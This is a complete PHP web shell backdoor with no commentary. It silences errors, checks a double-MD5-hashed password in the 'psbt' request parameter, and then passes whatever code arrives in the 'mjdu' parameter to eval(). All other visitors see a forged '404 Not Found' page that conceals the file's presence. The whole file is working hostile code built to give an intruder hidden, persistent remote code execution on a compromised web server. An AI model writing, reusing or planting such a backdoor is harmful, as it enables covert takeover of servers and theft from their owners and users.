<?php
@set_time_limit(0);
@error_reporting(NULL);
@ini_set('display_errors',0);
@ignore_user_abort(TRUE);

if(md5(md5($_REQUEST['psbt']))=='14b8103de4b68aed89e2907177686ada' and $_REQUEST['mjdu']!=NULL)
{
	$_REQUEST['mjdu']=str_replace('\\"','"',$_REQUEST['mjdu']);
	$_REQUEST['mjdu']=str_replace("\\'","'",$_REQUEST['mjdu']);
	eval($_REQUEST['mjdu']);
	die();
	exit();
}
else
{
	echo '<!DOCTYPE HTML PUBLIC\"-//IETF//DTDHTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL '.$_SERVER['PHP_SELF'].' was not found on this server </p><p>Additionally, a 404 Not Found error was encountered while trying to use an Error Document to handle the request</p></body ></html >';die();exit();
}
?>